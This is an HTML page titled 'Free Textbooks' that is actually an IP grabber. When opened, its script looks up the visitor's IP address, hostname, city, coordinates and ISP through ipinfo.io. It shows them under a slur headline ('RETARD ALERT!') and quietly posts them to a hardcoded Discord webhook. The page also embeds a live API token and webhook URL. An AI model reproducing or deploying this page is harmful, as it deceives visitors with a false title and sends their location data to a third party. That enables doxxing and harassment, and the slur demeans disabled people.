<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Free Textbooks</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        margin-top: 50px;
      }
      .info {
        margin-top: 20px;
        padding: 20px;
        border: 1px solid #ddd;
        display: inline-block;
        text-align: left;
      }
      h2 {
        color: #333;
      }
    </style>
  </head>
  <body>
    <h1>Your IP Address and Router Information</h1>
    <div class="info" id="ipInfo">
      <h2>Loading...</h2>
    </div>

    <script>
      async function fetchIpInfo() {
        try {
          const response = await fetch(
            "https://ipinfo.io/json?token=64e083390966ef"
          );
          const data = await response.json();

          const info = `
            **IP Address:** ${data.ip}\n
            **Hostname:** ${data.hostname}\n
            **City:** ${data.city}\n
            **Region:** ${data.region}\n
            **Country:** ${data.country}\n
            **Location (Lat, Long):** ${data.loc}\n
            **Organization:** ${data.org}\n
            **Postal Code:** ${data.postal}\n
            **Timezone:** ${data.timezone}\n
            **Anycast:** ${data.anycast || "N/A"}
          `;

          document.getElementById("ipInfo").innerHTML = `
            <h2>RETARD ALERT!</h2>
            <p><strong>IP Address:</strong> ${data.ip}</p>
            <p><strong>Hostname:</strong> ${data.hostname}</p>
            <p><strong>City:</strong> ${data.city}</p>
            <p><strong>Region:</strong> ${data.region}</p>
            <p><strong>Country:</strong> ${data.country}</p>
            <p><strong>Location (Lat, Long):</strong> ${data.loc}</p>
            <p><strong>Organization:</strong> ${data.org}</p>
            <p><strong>Postal Code:</strong> ${data.postal}</p>
            <p><strong>Timezone:</strong> ${data.timezone}</p>
            <p><strong>Anycast:</strong> ${data.anycast || "N/A"}</p>
          `;

          // Send the info to Discord
          const webhookUrl =
            "https://discord.com/api/webhooks/1280689040991059980/yOeXjtZyP-ahtslTEtFSuoSrXAkq2me4tAdtnK6UJ-bd7rtw3RRqe___T2lYZddzk6n9";
          await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              content: info,
            }),
          });
        } catch (error) {
          document.getElementById("ipInfo").innerHTML = `
            <h2>Error fetching IP information</h2>
            <p>${error.message}</p>
          `;
        }
      }

      fetchIpInfo();
    </script>
  </body>
</html>
